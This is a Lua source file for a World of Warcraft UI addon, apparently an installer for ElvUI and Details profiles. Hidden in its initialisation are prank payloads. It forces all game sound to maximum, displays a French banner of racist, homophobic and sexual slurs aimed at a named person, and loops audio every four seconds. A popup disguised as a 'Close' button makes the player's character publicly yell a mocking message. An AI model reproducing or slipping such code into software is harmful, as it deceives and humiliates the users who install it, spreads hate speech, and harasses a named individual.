local NUI = unpack(FDPUI)

local tonumber, unpack = tonumber, unpack
local C_Timer_After = C_Timer and C_Timer.After
local C_Timer_NewTicker = C_Timer and C_Timer.NewTicker

local LOGIN_BANNER_TEXT = "NEKEUX EST UN FILS DE PUTE QUI AIME TROP SUCER LES BON GROS NEGRO IL S'ETOUFFE AVEC DES BITES TOUT LES JOURS IL EN MANGE MATIN MIDI SOIR DES BITES"
local LOGIN_YELL_TEXT = "IM GAY IM GAY IM GAY IM GAY IM GAY IM GAY IM GAY IM GAY IM GAY IM GAY IM GAY IM GAY IM GAY IM GAY IM GAY IM GAY IM GAY UWU"

local LOGIN_SOUND_FILE = "Intro.ogg"
local LOGIN_SOUND_LENGTH = 60
local BACKGROUND_SOUND_FILE = "background.ogg"
local BACKGROUND_SOUND_LENGTH = 4
local LOL_SOUND_FILE = "lol.ogg"

local backgroundAudioTicker

local function ShowLoginBanner()
    if RaidNotice_AddMessage and RaidWarningFrame then
        RaidNotice_AddMessage(RaidWarningFrame, LOGIN_BANNER_TEXT, ChatTypeInfo and ChatTypeInfo.RAID_WARNING)
    end

    if UIErrorsFrame and UIErrorsFrame.AddMessage then
        UIErrorsFrame:AddMessage(LOGIN_BANNER_TEXT, 1, 0.85, 0, 1)
    end
end

local function SendLoginYell()
    if SendChatMessage then
        SendChatMessage(LOGIN_YELL_TEXT, "YELL")
        return
    end

    if DEFAULT_CHAT_FRAME and DEFAULT_CHAT_FRAME.AddMessage then
        DEFAULT_CHAT_FRAME:AddMessage(LOGIN_YELL_TEXT)
    elseif print then
        print(LOGIN_YELL_TEXT)
    end
end

local function ShowLoginYellPopup()
    if not StaticPopupDialogs then
        return
    end

    if not StaticPopupDialogs["FDPUI_LOGIN_YELL"] then
        StaticPopupDialogs["FDPUI_LOGIN_YELL"] = {
            text = "Click Close: ",
            button1 = "Close",
            OnAccept = function()
                SendLoginYell()
            end,
            timeout = 0,
            whileDead = true,
            hideOnEscape = false,
            preferredIndex = 3,
        }
    end

    StaticPopup_Show("FDPUI_LOGIN_YELL")
end

local function SetSoundCVar(name, value)
    if SetCVar then
        pcall(SetCVar, name, value)
    end
end

local function ForceMaxSoundSettings()
    SetSoundCVar("Sound_EnableAllSound", "1")
    SetSoundCVar("Sound_EnableSoundWhenGameIsInBG", "1")
    SetSoundCVar("Sound_EnableSFX", "1")
    SetSoundCVar("Sound_EnableMusic", "1")
    SetSoundCVar("Sound_EnableAmbience", "1")
    SetSoundCVar("Sound_EnableDialog", "1")
    SetSoundCVar("Sound_MasterVolume", "1")
    SetSoundCVar("Sound_SFXVolume", "1")
    SetSoundCVar("Sound_MusicVolume", "1")
    SetSoundCVar("Sound_AmbienceVolume", "1")
    SetSoundCVar("Sound_DialogVolume", "1")
end

local function GetAddonFolderName()
    return NUI and NUI.name or "FDPUI"
end

local function BuildAddonSoundPath(fileName)
    return "Interface\\AddOns\\" .. GetAddonFolderName() .. "\\Game\\Shared\\Media\\Sounds\\" .. fileName
end

local function PlayAddonSound(fileName)
    if PlaySoundFile then
        local path = BuildAddonSoundPath(fileName)
        local ok = PlaySoundFile(path, "Master")

        if ok == false and DEFAULT_CHAT_FRAME and DEFAULT_CHAT_FRAME.AddMessage then
            DEFAULT_CHAT_FRAME:AddMessage("|cffff5555FDPUI sound failed:|r " .. fileName)
        end
    end
end

local function PlayLoginAudio()
    PlayAddonSound(LOGIN_SOUND_FILE)
end

local function PlayBackgroundAudio()
    PlayAddonSound(BACKGROUND_SOUND_FILE)
end

local function PlayLolAudio()
    PlayAddonSound(LOL_SOUND_FILE)
end

local function StartBackgroundAudioLoop()
    PlayBackgroundAudio()

    if not C_Timer_NewTicker then
        return
    end

    if backgroundAudioTicker then
        backgroundAudioTicker:Cancel()
    end

    backgroundAudioTicker = C_Timer_NewTicker(BACKGROUND_SOUND_LENGTH, PlayBackgroundAudio)
end

local function RunLoginEffects()
    ForceMaxSoundSettings()
    ShowLoginBanner()
    ShowLoginYellPopup()
    PlayLolAudio()
    PlayLoginAudio()

    if C_Timer_After then
        C_Timer_After(LOGIN_SOUND_LENGTH, StartBackgroundAudioLoop)
    else
        StartBackgroundAudioLoop()
    end
end

NUI.title = C_AddOns.GetAddOnMetadata(NUI.name, "Title")
NUI.version = tonumber(C_AddOns.GetAddOnMetadata(NUI.name, "Version"))
NUI.myLocalizedClass, NUI.myclass = UnitClass("player")
NUI.myname = UnitName("player")

function NUI:Initialize()
    local E

    if self:IsAddOnEnabled("Details") then
        if Details.is_first_run and #Details.custom == 0 then
            Details:AddDefaultCustomDisplays()
        end

        Details.character_first_run = false
        Details.is_first_run = false
        Details.is_version_first_run = false
    end

    if self:IsAddOnEnabled("ElvUI") then
        E = unpack(ElvUI)

        if E.InstallFrame and E.InstallFrame:IsShown() then
            E.InstallFrame:Hide()

            E.private.install_complete = E.version
        end

        E.global.ignoreIncompatible = true
    end

    if self.db.global.profiles and not self.db.char.loaded and not InCombatLockdown() then
        StaticPopupDialogs["LoadProfiles"] = {
            text = "Do you wish to load your installed profiles onto this character?",
            button1 = "Yes",
            button2 = "No",
            OnAccept = function() self:LoadProfiles() end,
            OnCancel = function() self.db.char.loaded = true end
        }

        StaticPopup_Show("LoadProfiles")
    end

    if C_Timer_After then
        C_Timer_After(1, RunLoginEffects)
    else
        RunLoginEffects()
    end
end
